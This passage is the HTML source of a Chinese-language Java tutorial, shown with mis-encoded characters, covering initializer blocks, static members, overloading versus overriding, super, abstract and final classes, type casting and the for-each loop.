class="line"></span><br><span class="line">        <span class="comment">// 5. åˆå§‹åŒ–å­ç±»ï¼ˆä¼šå…ˆåˆå§‹åŒ–çˆ¶ç±»ï¼‰</span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ChildClass</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 6. ä½œä¸ºå¯åŠ¨ç±»ï¼ˆåŒ…å«mainæ–¹æ³•çš„ç±»ï¼‰</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 7. æŸäº›åå°„è°ƒç”¨</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TriggerDemo</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="type">String</span> <span class="variable">staticField</span> <span class="operator">=</span> <span class="string">&quot;é™æ€å­—æ®µ&quot;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;TriggerDemoé™æ€ä»£ç å—æ‰§è¡Œ&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">staticMethod</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;é™æ€æ–¹æ³•æ‰§è¡Œ&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ParentClass</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;ParentClassé™æ€ä»£ç å—æ‰§è¡Œ&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ChildClass</span> <span class="keyword">extends</span> <span class="title class_">ParentClass</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;ChildClassé™æ€ä»£ç å—æ‰§è¡Œ&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br/><h2 id="å®ä¾‹ä»£ç å—"><a href="#å®ä¾‹ä»£ç å—" class="headerlink" title="å®ä¾‹ä»£ç å—"></a>å®ä¾‹ä»£ç å—</h2><p>å®ä¾‹ä»£ç å—æ˜¯æ²¡æœ‰<code>static</code>ä¿®é¥°çš„ä»£ç å—ï¼Œåœ¨æ¯æ¬¡åˆ›å»ºå¯¹è±¡æ—¶æ‰§è¡Œ</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyClass</span> &#123;</span><br><span class="line">    <span class="comment">// å®ä¾‹ä»£ç å—</span></span><br><span class="line">    &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;å®ä¾‹ä»£ç å—æ‰§è¡Œ&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MyClass</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;æ„é€ æ–¹æ³•æ‰§è¡Œ&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//å®ä¾‹åŒ–MyClassæ—¶è¾“å‡º:</span></span><br><span class="line"><span class="comment">//å®ä¾‹ä»£ç å—æ‰§è¡Œ</span></span><br><span class="line"><span class="comment">//æ„é€ æ–¹æ³•æ‰§è¡Œ</span></span><br></pre></td></tr></table></figure><p><strong>æ‰§è¡Œé¡ºåº</strong>ï¼šçˆ¶ç±»å®ä¾‹ä»£ç å— â†’ çˆ¶ç±»æ„é€ æ–¹æ³• â†’ å­ç±»å®ä¾‹ä»£ç å— â†’ å­ç±»æ„é€ æ–¹æ³•</p><br/><h2 id="staticä¿®é¥°ç¬¦"><a href="#staticä¿®é¥°ç¬¦" class="headerlink" title="staticä¿®é¥°ç¬¦"></a>staticä¿®é¥°ç¬¦</h2><p>å‡¡æ˜¯è¢«<code>static</code>ä¿®é¥°çš„å˜é‡ã€æ–¹æ³•ã€ä»£ç å—ï¼Œè¿™äº›éƒ½å±äºç±»æœ¬èº«ï¼Œä¸å±äºå¯¹è±¡ï¼Œä½†å¯¹è±¡å¯ä»¥è®¿é—®è¿™äº›staticæˆå‘˜ï¼Œæ‰€æœ‰å¯¹è±¡å…±äº«ä¸€ä¸ªstaticæˆå‘˜ï¼Œä¿®æ”¹è¿™äº›staticæˆå‘˜ä¼šå½±å“æ‰€æœ‰å¯¹è±¡</p><table><thead><tr><th align="left">æ–¹é¢</th><th align="left">staticæˆå‘˜</th><th align="left">å®ä¾‹æˆå‘˜</th></tr></thead><tbody><tr><td align="left"><strong>å½’å±</strong></td><td align="left">å±äºç±»</td><td align="left">å±äºå¯¹è±¡</td></tr><tr><td align="left"><strong>å†…å­˜ä½ç½®</strong></td><td align="left">æ–¹æ³•åŒº&#x2F;å…ƒç©ºé—´</td><td align="left">å †å†…å­˜</td></tr><tr><td align="left"><strong>åŠ è½½æ—¶æœº</strong></td><td align="left">ç±»åŠ è½½æ—¶</td><td align="left">å¯¹è±¡åˆ›å»ºæ—¶</td></tr><tr><td align="left"><strong>ç”Ÿå‘½å‘¨æœŸ</strong></td><td align="left">ç¨‹åºè¿è¡ŒæœŸé—´</td><td align="left">å¯¹è±¡å­˜åœ¨æœŸé—´</td></tr><tr><td align="left"><strong>è®¿é—®æ–¹å¼</strong></td><td align="left"><code>ç±»å.æˆå‘˜</code></td><td align="left"><code>å¯¹è±¡.æˆå‘˜</code></td></tr><tr><td align="left"><strong>å…±äº«æ€§</strong></td><td align="left">æ‰€æœ‰å¯¹è±¡å…±äº«</td><td align="left">æ¯ä¸ªå¯¹è±¡ç‹¬ç«‹</td></tr><tr><td align="left"><strong>å¯¹è±¡èƒ½å¦è®¿é—®</strong></td><td align="left">å¯ä»¥ï¼ˆä¸æ¨èï¼‰</td><td align="left">å¯ä»¥ï¼ˆå¿…é¡»ï¼‰</td></tr><tr><td align="left"><strong>ç±»èƒ½å¦ç›´æ¥è®¿é—®</strong></td><td align="left">å¯ä»¥</td><td align="left">ä¸å¯ä»¥</td></tr></tbody></table><br/><h2 id="æ–¹æ³•é‡è½½å’Œæ–¹æ³•é‡å†™"><a href="#æ–¹æ³•é‡è½½å’Œæ–¹æ³•é‡å†™" class="headerlink" title="æ–¹æ³•é‡è½½å’Œæ–¹æ³•é‡å†™"></a>æ–¹æ³•é‡è½½å’Œæ–¹æ³•é‡å†™</h2><table><thead><tr><th align="left">å¯¹æ¯”ç»´åº¦</th><th align="left">æ–¹æ³•é‡è½½ (Overload)</th><th align="left">æ–¹æ³•é‡å†™ (Override)</th></tr></thead><tbody><tr><td align="left"><strong>å®šä¹‰</strong></td><td align="left">åŒä¸€ä¸ªç±»ä¸­ï¼Œå¤šä¸ªæ–¹æ³•<strong>åç§°ç›¸åŒä½†å‚æ•°ä¸åŒ</strong></td><td align="left">å­ç±»ä¸­é‡æ–°å®šä¹‰çˆ¶ç±»çš„<strong>åŒååŒå‚æ•°</strong>æ–¹æ³•</td></tr><tr><td align="left"><strong>ä½ç½®å…³ç³»</strong></td><td align="left">åŒä¸€ä¸ªç±»ä¸­ï¼Œæˆ–çˆ¶å­ç±»ä¹‹é—´</td><td align="left">åªèƒ½åœ¨çˆ¶å­ç±»ä¹‹é—´ï¼ˆç»§æ‰¿å…³ç³»ï¼‰</td></tr><tr><td align="left"><strong>æ–¹æ³•ç­¾å</strong></td><td align="left"><strong>å¿…é¡»ä¸åŒ</strong>ï¼ˆå‚æ•°ç±»å‹ã€ä¸ªæ•°ã€é¡ºåºè‡³å°‘ä¸€ä¸ªä¸åŒï¼‰</td><td align="left"><strong>å¿…é¡»å®Œå…¨ç›¸åŒ</strong>ï¼ˆæ–¹æ³•åå’Œå‚æ•°åˆ—è¡¨ï¼‰</td></tr><tr><td align="left"><strong>è¿”å›ç±»å‹</strong></td><td align="left">å¯ä»¥ä¸åŒï¼Œä½†<strong>ä»…è¿”å›ç±»å‹ä¸åŒä¸èƒ½æ„æˆé‡è½½</strong></td><td align="left">å¿…é¡»ç›¸åŒï¼Œæˆ–æ˜¯çˆ¶ç±»è¿”å›ç±»å‹çš„<strong>å­ç±»</strong>ï¼ˆåå˜è¿”å›ï¼‰</td></tr><tr><td align="left"><strong>è®¿é—®ä¿®é¥°ç¬¦</strong></td><td align="left">å¯ä»¥ä¸åŒï¼Œæ²¡æœ‰é™åˆ¶</td><td align="left"><strong>ä¸èƒ½æ›´ä¸¥æ ¼</strong>ï¼ˆå¯ä»¥æ›´å®½æ¾ï¼‰</td></tr><tr><td align="left"><strong>å¼‚å¸¸å£°æ˜</strong></td><td align="left">å¯ä»¥ä¸åŒï¼Œæ²¡æœ‰é™åˆ¶</td><td align="left"><strong>ä¸èƒ½æŠ›å‡ºæ›´å®½æ³›</strong>çš„æ£€æŸ¥å¼‚å¸¸ å¯ä»¥æŠ›å‡ºç›¸åŒã€æ›´å…·ä½“æˆ–ä¸æŠ›å‡ºå¼‚å¸¸</td></tr><tr><td align="left"><strong>static&#x2F;final</strong></td><td align="left">å¯ä»¥é‡è½½static&#x2F;finalæ–¹æ³•</td><td align="left"><strong>ä¸èƒ½é‡å†™</strong>finalæ–¹æ³• staticæ–¹æ³•åªèƒ½<strong>éšè—</strong>ï¼Œä¸æ˜¯é‡å†™</td></tr><tr><td align="left"><strong>privateæ–¹æ³•</strong></td><td align="left">å¯ä»¥é‡è½½privateæ–¹æ³•</td><td align="left"><strong>ä¸èƒ½é‡å†™</strong>ï¼ˆå­ç±»ä¸å¯è§ï¼‰</td></tr><tr><td align="left"><strong>ç»‘å®šæ—¶æœº</strong></td><td align="left"><strong>ç¼–è¯‘æ—¶ç»‘å®š</strong>ï¼ˆé™æ€ç»‘å®šã€æ—©æœŸç»‘å®šï¼‰</td><td align="left"><strong>è¿è¡Œæ—¶ç»‘å®š</strong>ï¼ˆåŠ¨æ€ç»‘å®šã€æ™šæœŸç»‘å®šï¼‰</td></tr><tr><td align="left"><strong>å¤šæ€æ€§</strong></td><td align="left"><strong>ç¼–è¯‘æ—¶å¤šæ€</strong>ï¼ˆé™æ€å¤šæ€ï¼‰</td><td align="left"><strong>è¿è¡Œæ—¶å¤šæ€</strong>ï¼ˆåŠ¨æ€å¤šæ€ï¼‰</td></tr><tr><td align="left"><strong>æ€§èƒ½</strong></td><td align="left">ç¼–è¯‘æ—¶ç¡®å®šï¼Œæ€§èƒ½è¾ƒå¥½</td><td align="left">è¿è¡Œæ—¶ç¡®å®šï¼Œç¨æœ‰æ€§èƒ½å¼€é”€</td></tr><tr><td align="left"><strong>@Overrideæ³¨è§£</strong></td><td align="left">ä¸éœ€è¦ï¼Œé€šå¸¸ä¸ä½¿ç”¨</td><td align="left"><strong>å¼ºçƒˆå»ºè®®ä½¿ç”¨</strong>ï¼Œè®©ç¼–è¯‘å™¨æ£€æŸ¥æ˜¯å¦æ­£ç¡®é‡å†™</td></tr><tr><td align="left"><strong>è°ƒç”¨æœºåˆ¶</strong></td><td align="left">ç¼–è¯‘å™¨æ ¹æ®<strong>å‚æ•°åˆ—è¡¨</strong>å†³å®šè°ƒç”¨å“ªä¸ªæ–¹æ³•</td><td align="left">JVMæ ¹æ®<strong>å¯¹è±¡çš„å®é™…ç±»å‹</strong>å†³å®šè°ƒç”¨å“ªä¸ªæ–¹æ³•</td></tr><tr><td align="left"><strong>è®¾è®¡ç›®çš„</strong></td><td align="left">æä¾›<strong>å¤šç§æ–¹å¼</strong>å¤„ç†ä¸åŒç±»å‹&#x2F;æ•°é‡çš„æ•°æ®</td><td align="left"><strong>ä¿®æ”¹&#x2F;æ‰©å±•</strong>çˆ¶ç±»è¡Œä¸ºï¼Œå®ç°å¤šæ€</td></tr><tr><td align="left"><strong>åº”ç”¨åœºæ™¯</strong></td><td align="left">æ„é€ å‡½æ•°é‡è½½ã€å·¥å…·æ–¹æ³•å¤šç§å½¢å¼</td><td align="left">æ¡†æ¶è®¾è®¡ã€æ¨¡æ¿æ–¹æ³•æ¨¡å¼ã€å¤šæ€å®ç°</td></tr></tbody></table> <br/><h2 id="superè®¿é—®çˆ¶ç±»æˆå‘˜"><a href="#superè®¿é—®çˆ¶ç±»æˆå‘˜" class="headerlink" title="superè®¿é—®çˆ¶ç±»æˆå‘˜"></a>superè®¿é—®çˆ¶ç±»æˆå‘˜</h2><p><strong>superä¸å¯ä»¥è®¿é—®çˆ¶ç±»çš„ç§æœ‰æˆå‘˜</strong></p><p>è‹¥è¦ç”¨superè®¿é—®çˆ¶ç±»æ„é€ ï¼Œåªèƒ½åœ¨å­ç±»æ„é€ ä¸­ä½¿ç”¨ï¼Œä¸”é¡»å‡ºç°åœ¨ç¬¬1è¡Œ</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Animal</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// çˆ¶ç±»æ„é€ æ–¹æ³•1</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Animal</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Animalæ— å‚æ„é€ æ–¹æ³•è¢«è°ƒç”¨&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.name = <span class="string">&quot;æœªçŸ¥åŠ¨ç‰©&quot;</span>;</span><br><span class="line">        <span class="built_in">this</span>.age = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// çˆ¶ç±»æ„é€ æ–¹æ³•2</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Animal</span><span class="params">(String name, <span class="type">int</span> age)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Animalæœ‰å‚æ„é€ æ–¹æ³•è¢«è°ƒç”¨&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Dog</span> <span class="keyword">extends</span> <span class="title class_">Animal</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String breed;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// å­ç±»æ„é€ æ–¹æ³•1ï¼šè°ƒç”¨çˆ¶ç±»æ— å‚æ„é€ </span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Dog</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>();  <span class="comment">// è°ƒç”¨çˆ¶ç±»Animal()ï¼Œå¯ä»¥çœç•¥ï¼ˆç¼–è¯‘å™¨è‡ªåŠ¨æ·»åŠ ï¼‰</span></span><br><span class="line">        System.out.println(<span class="string">&quot;Dogæ— å‚æ„é€ æ–¹æ³•è¢«è°ƒç”¨&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.breed = <span class="string">&quot;æœªçŸ¥å“ç§&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// å­ç±»æ„é€ æ–¹æ³•2ï¼šè°ƒç”¨çˆ¶ç±»æœ‰å‚æ„é€ </span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Dog</span><span class="params">(String name, <span class="type">int</span> age, String breed)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(name, age);  <span class="comment">// å¿…é¡»æ”¾åœ¨ç¬¬ä¸€è¡Œï¼</span></span><br><span class="line">        System.out.println(<span class="string">&quot;Dogæœ‰å‚æ„é€ æ–¹æ³•è¢«è°ƒç”¨&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.breed = breed;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br/><h2 id="Objectç±»"><a href="#Objectç±»" class="headerlink" title="Objectç±»"></a>Objectç±»</h2><p> Objectç±»æ˜¯æ‰€æœ‰ç±»çš„çˆ¶ç±»ï¼Œä»»ä½•ç±»éƒ½é»˜è®¤ç»§æ‰¿è‡ªObjectç±»ï¼Œä»¥ä¸‹ä¸¤ä¸ªæ–¹æ³•å¸¸è¢«é‡å†™</p><p>toStringæ–¹æ³•ï¼šè¿”å›å½“å‰å¯¹è±¡æœ¬èº«çš„æœ‰å…³ä¿¡æ¯ï¼ŒæŒ‰å­—ç¬¦ä¸²è¿”å›ï¼Œå†…å®¹ä¸ºç±»çš„å…¨åç§°å’Œå†…å­˜åœ°å€</p><p>equalsæ–¹æ³•ï¼šæ¯”è¾ƒä¸¤ä¸ªå¯¹è±¡åœ°å€æ˜¯å¦ç›¸åŒï¼Œæ˜¯åˆ™è¿”å›trueï¼Œç›¸å½“äº<code>==</code></p><blockquote><p><code>==</code>åœ¨æ¯”è¾ƒç®€å•æ•°æ®ç±»å‹æ—¶ç›´æ¥æ¯”è¾ƒå€¼ï¼Œæ¯”è¾ƒå¼•ç”¨ç±»å‹æ—¶åˆ™åˆ¤æ–­ä¸¤è€…æ˜¯å¦ä¸ºåŒä¸€å¯¹è±¡ï¼ˆåœ°å€ï¼‰</p></blockquote><blockquote><p>ä¸€ä¸ªå­—ç¬¦ä¸²å˜é‡aåœ¨è¿›è¡Œa.equals(â€œAâ€)è¿ç®—çš„æœ¬è´¨ä¹Ÿæ˜¯è°ƒç”¨äº†equalsæ–¹æ³•ï¼Œä½†è¿™ä¸ªæ–¹æ³•åœ¨Stringç±»è¿›è¡Œäº†æ”¹å†™ï¼Œåªæ¯”è¾ƒå†…å®¹æ˜¯å¦ç›¸åŒ</p></blockquote> <br/><h2 id="æŠ½è±¡ç±»å’ŒæŠ½è±¡æ–¹æ³•"><a href="#æŠ½è±¡ç±»å’ŒæŠ½è±¡æ–¹æ³•" class="headerlink" title="æŠ½è±¡ç±»å’ŒæŠ½è±¡æ–¹æ³•"></a>æŠ½è±¡ç±»å’ŒæŠ½è±¡æ–¹æ³•</h2><p>è¢«<code>abstract</code>ä¿®é¥°çš„ç±»æˆ–æ–¹æ³•å°±æ˜¯æŠ½è±¡ç±»æˆ–æŠ½è±¡æ–¹æ³•</p><blockquote><p>æŠ½è±¡ç±»ä¸­å¯ä»¥æœ‰éæŠ½è±¡æ–¹æ³•</p><p>æŠ½è±¡æ–¹æ³•å¿…é¡»åœ¨æŠ½è±¡ç±»ä¸­</p><p>æŠ½è±¡æ–¹æ³•æ²¡æœ‰æ–¹æ³•ä½“</p><p>æŠ½è±¡æ–¹æ³•å¿…é¡»åœ¨å­ç±»ä¸­è¢«å®ç°,é™¤éå­ç±»æ˜¯æŠ½è±¡ç±»</p></blockquote><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// æŠ½è±¡ç±»ï¼šåŠ¨ç‰©</span></span><br><span class="line"><span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">Animal</span> &#123;</span><br><span class="line">    <span class="comment">// å±æ€§ï¼ˆå¯ä»¥æœ‰éæŠ½è±¡çš„å±æ€§å’Œæ–¹æ³•ï¼‰</span></span><br><span class="line">    <span class="keyword">protected</span> String name;</span><br><span class="line">    <span class="keyword">protected</span> <span class="type">int</span> age;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// æ„é€ æ–¹æ³•</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Animal</span><span class="params">(String name, <span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// æŠ½è±¡æ–¹æ³•ï¼šåŠ¨ç‰©å‘å‡ºå£°éŸ³ï¼ˆæ²¡æœ‰æ–¹æ³•ä½“ï¼‰</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title function_">makeSound</span><span class="params">()</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// æŠ½è±¡æ–¹æ³•ï¼šåŠ¨ç‰©å¦‚ä½•è¿›é£Ÿ</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title function_">eat</span><span class="params">()</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// å…·ä½“æ–¹æ³•ï¼šæ‰€æœ‰åŠ¨ç‰©éƒ½ä¼šç¡è§‰</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">sleep</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(name + <span class="string">&quot;æ­£åœ¨ç¡è§‰...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// å…·ä½“æ–¹æ³•ï¼šè·å–ä¿¡æ¯</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">displayInfo</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;åŠ¨ç‰©: &quot;</span> + name + <span class="string">&quot;, å¹´é¾„: &quot;</span> + age + <span class="string">&quot;å²&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// å…·ä½“å­ç±»ï¼šç‹—</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Dog</span> <span class="keyword">extends</span> <span class="title class_">Animal</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String breed;  <span class="comment">// ç‰¹æœ‰å±æ€§ï¼šå“ç§</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Dog</span><span class="params">(String name, <span class="type">int</span> age, String breed)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(name, age);  <span class="comment">// è°ƒç”¨çˆ¶ç±»æ„é€ æ–¹æ³•</span></span><br><span class="line">        <span class="built_in">this</span>.breed = breed;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// å¿…é¡»å®ç°çˆ¶ç±»çš„æŠ½è±¡æ–¹æ³•</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">makeSound</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(name + <span class="string">&quot;æ±ªæ±ªå«ï¼&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">eat</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(name + <span class="string">&quot;æ­£åœ¨åƒç‹—ç²®&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// å¯ä»¥æ·»åŠ ç‰¹æœ‰æ–¹æ³•</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">wagTail</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(name + <span class="string">&quot;å¼€å¿ƒåœ°æ‘‡å°¾å·´&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br/><h2 id="finalä¿®é¥°ç¬¦"><a href="#finalä¿®é¥°ç¬¦" class="headerlink" title="finalä¿®é¥°ç¬¦"></a>finalä¿®é¥°ç¬¦</h2><blockquote><p>finalä¿®é¥°çš„ç±»ä¸èƒ½æœ‰å­ç±»</p><p>finalä¿®é¥°çš„æ–¹æ³•ä¸èƒ½è¢«é‡å†™</p><p>finalä¿®é¥°çš„å˜é‡ä¼šå˜æˆå¸¸é‡</p></blockquote> <br/><h2 id="å‘ä¸Šè½¬å‹å’Œå‘ä¸‹è½¬å‹"><a href="#å‘ä¸Šè½¬å‹å’Œå‘ä¸‹è½¬å‹" class="headerlink" title="å‘ä¸Šè½¬å‹å’Œå‘ä¸‹è½¬å‹"></a>å‘ä¸Šè½¬å‹å’Œå‘ä¸‹è½¬å‹</h2><h3 id="å‘ä¸Šè½¬å‹"><a href="#å‘ä¸Šè½¬å‹" class="headerlink" title="å‘ä¸Šè½¬å‹"></a>å‘ä¸Šè½¬å‹</h3><p>è‡ªåŠ¨éšå¼è½¬æ¢ï¼Œæ€»æ˜¯å®‰å…¨</p><p><strong>è¯­æ³•</strong>ï¼š<code>Parent p = new Child();</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Animal</span> &#123;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">eat</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;åŠ¨ç‰©åƒä¸œè¥¿&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Dog</span> <span class="keyword">extends</span> <span class="title class_">Animal</span> &#123;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">bark</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;æ±ªæ±ªå«&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">WhyCasting</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    <span class="type">Animal</span> <span class="variable">animal</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Dog</span>();  <span class="comment">// åªçŸ¥é“æ˜¯Animalï¼Œä¸çŸ¥é“å…·ä½“ç±»å‹</span></span><br><span class="line">        animal.eat();   <span class="comment">//  å¯ä»¥</span></span><br><span class="line">        animal.bark();  <span class="comment">//  ç¼–è¯‘é”™è¯¯ï¼ç¼–è¯‘å™¨åªçŸ¥é“å®ƒæ˜¯Animal</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="å‘ä¸‹è½¬å‹"><a href="#å‘ä¸‹è½¬å‹" class="headerlink" title="å‘ä¸‹è½¬å‹"></a>å‘ä¸‹è½¬å‹</h3><p>éœ€è¦è°ƒç”¨å­ç±»ç‰¹æœ‰æ–¹æ³•ï¼Œè€Œå¼•ç”¨æ˜¯çˆ¶ç±»ç±»å‹æ—¶ï¼Œéœ€è¦æ˜¾å¼å¼ºåˆ¶è½¬æ¢ï¼Œå¯èƒ½ä¸å®‰å…¨</p><p><strong>è¯­æ³•</strong>ï¼š<code>Child c = (Child) p;</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Animal</span> &#123;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">eat</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;åŠ¨ç‰©åƒä¸œè¥¿&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Dog</span> <span class="keyword">extends</span> <span class="title class_">Animal</span> &#123;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">bark</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;æ±ªæ±ªå«&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">WhyCasting</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    <span class="type">Dog</span> <span class="variable">dog2</span> <span class="operator">=</span> (Dog) animal;  <span class="comment">// å¼ºåˆ¶è½¬æ¢ï¼šæˆ‘ç¡®å®šanimalæ˜¯Dog</span></span><br><span class="line">        dog2.eat();   <span class="comment">//  å¯ä»¥</span></span><br><span class="line">        dog2.bark();  <span class="comment">//  å¯ä»¥</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure> <br/><h2 id="forå¢å¼ºå¾ªç¯ï¼ˆfor-eachå¾ªç¯ï¼‰"><a href="#forå¢å¼ºå¾ªç¯ï¼ˆfor-eachå¾ªç¯ï¼‰" class="headerlink" title="forå¢å¼ºå¾ªç¯ï¼ˆfor-eachå¾ªç¯ï¼‰"></a>forå¢å¼ºå¾ªç¯ï¼ˆfor-eachå¾ªç¯ï¼‰</h2><p>åŸºæœ¬è¯­æ³•</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (å…ƒç´ ç±»å‹ å…ƒç´ å˜é‡ : é›†åˆæˆ–æ•°ç»„) &#123;</span><br><span class="line">    <span class="comment">// å¾ªç¯ä½“</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure> <br/><h2 id="æ¥å£-Interface"><a href="#æ¥å£-Interface" class="headerlink" 